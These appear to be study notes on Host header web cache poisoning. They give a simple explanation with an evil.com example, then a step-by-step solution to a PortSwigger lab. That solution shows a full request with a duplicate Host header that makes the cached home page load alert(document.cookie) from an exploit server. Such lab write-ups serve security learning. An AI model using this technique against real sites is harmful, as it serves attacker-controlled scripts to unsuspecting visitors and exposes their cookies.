
## When `Host: example.com` is used

Request:

`GET / HTTP/1.1 Host: example.com`

Response HTML:

`<img src="http://example.com/logo.png">`

### What does this mean?

 Yes — **the image is loaded from the `example.com` server**.

When the browser sees:

`<img src="http://example.com/logo.png">`

It makes a **new request**:

`GET /logo.png HTTP/1.1 Host: example.com`

 So:

- Image comes from **example.com**
    
- Controlled by **example.com**
    

---

## 2️ If you change `Host` to `evil.com`

You (attacker) send:

`GET / HTTP/1.1 Host: evil.com`

Server response becomes:

`<img src="http://evil.com/logo.png">`

### What happens now?

 **The HTML is still coming from the victim website**,  
BUT the image is now fetched from **evil.com**.

The browser will do:

`GET /logo.png HTTP/1.1 Host: evil.com`

 **the image is now requested from YOUR evil.com server**

---------

## What is a Web Cache? (VERY SIMPLE)

Imagine a **college canteen** 🍽️

- First student asks for **samosa**
    
- Cook makes it fresh
    
- Then the canteen keeps **extra samosas ready**
    

Now:

- Next student asks for samosa
    
- Canteen gives **ready one**
    
- No need to cook again
    

👉 This is **cache**

---

## 🧠 Step 2: Web Cache = same idea, for websites

A **web cache** stores **ready-made pages** so the server doesn’t have to create them again and again.

Example:

1️⃣ First user visits:

`https://example.com/`

Server:

- Builds HTML
    
- Sends it
    

Cache:

- Saves a **copy**
    

2️⃣ Second user visits:

`https://example.com/`

Cache:

- Sends saved copy
    
- Server not involved
    

📦 Faster website  
📉 Less server load

---

## 🧠 Step 3: What does the cache look at before saving?

Cache asks:

> “Is this page already saved?”

To decide, it uses something called a **cache key**  
(you don’t need to remember this name yet)

Usually based on:

- URL (`/`)
    
- Query (`?id=1`)
    
- Sometimes headers
    

---

## 🧠 Step 4: The BIG mistake (this is the bug)

Some caches **do NOT check the Host header**.

They think:

> “`/` is `/`, doesn’t matter who asked”

⚠️ This is wrong.

---

## 🧠 Step 5: Attacker poisons the cache (slow)

### 🧑‍💻 You (attacker)

You send:

`GET / Host: evil.com`

Server says:

`<img src="http://evil.com/logo.png">`

Cache thinks:

> “This is the page for `/`. I’ll save it.”

💾 Cached!

---

### 👨‍👩‍👧 Normal user

Browser sends:

`GET / Host: victim.com`

Cache thinks:

> “Oh, I already have `/`”

Cache sends:

`<img src="http://evil.com/logo.png">`

🔥 **Victim never touched evil.com — but their browser loads it**


## Lab: Web cache poisoning via ambiguous requests

**Description :**

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes `alert(document.cookie)` in the victim's browser.

### Solution:

At first when we , when we visit the home page of the website,

```
GET / HTTP/1.1
Host: 0a2d004c04b58b5a8056f89900f5000a.h1-web-security-academy.net
Cookie: session=7aAMSfvzOetq3hfybsGnmo5ztogcP7GV; _lab=46%7cMCwCFE9Rg%2b8DjBg8tqOqr8VRhTZB800gAhRfMcdy7AgNALYnGPvhNxOdXR6phRmDyBRRiFAcoJnsOQ%2feXOggj1y%2bFaMf4kj0ZHDlfFha3F1GQbbdlgk8RKJQJ1b0zxKryhVCW4ZIKOYPLmZD%2bu87Ir8d%2bozuHEXUX1PsHicHNRV%2fvoH9L9E%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

when we see the response , 

```
X-Cache: miss
```

, so the cache didn't saved the page, when we submit the website again and again it shows the 
~~~
X-Cache: hit
~~~

and then when we add the second host for example..

Host: bing.com

 src="//bing.com/resources/js/tracking.js">


and then , we need to create the new file and then add this `alert(document.cookie)` in the body and then change the url to `/resources/js/tracking.js` and then add the second host of the exploit.user-id and then final request is ,

```
GET / HTTP/1.1
Host: 0a2d004c04b58b5a8056f89900f5000a.h1-web-security-academy.net
Host: exploit-0af700f604838b1e80b9f7f401cf0004.exploit-server.net
Cookie: session=2e2tvHqmdmfklvaz3VJnWtVNskWTSrDc; _lab=46%7cMCwCFGM3QHh%2fNmsje6C6DJ2YpfEP0FaMAhRHIHo4ELDW8n%2bw%2bys3zMWdg8oNaVCTUiMXS%2fChem6zuQOmpS7%2bM5%2f5PstoMzkKQxM0jtH%2fkUsd7b10se2rjTZvuR5ZlA3BU46y3S1P4zOkgkVHi6sw9i3Ldps0JMPSLWWpRcapMMmV8AHHbhk%3d
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

When we see the X-Cache: hit , and when we visit the page , we got the pop menu , **lab solved**

**Why we are adding the `/resources/js/tracking.js` in the url , means any request will see the `/resources/js/tracking.js`  so , we need any code in the tracking.js if nothing happen , so we write the alert(document.cookie) in the body**

----------


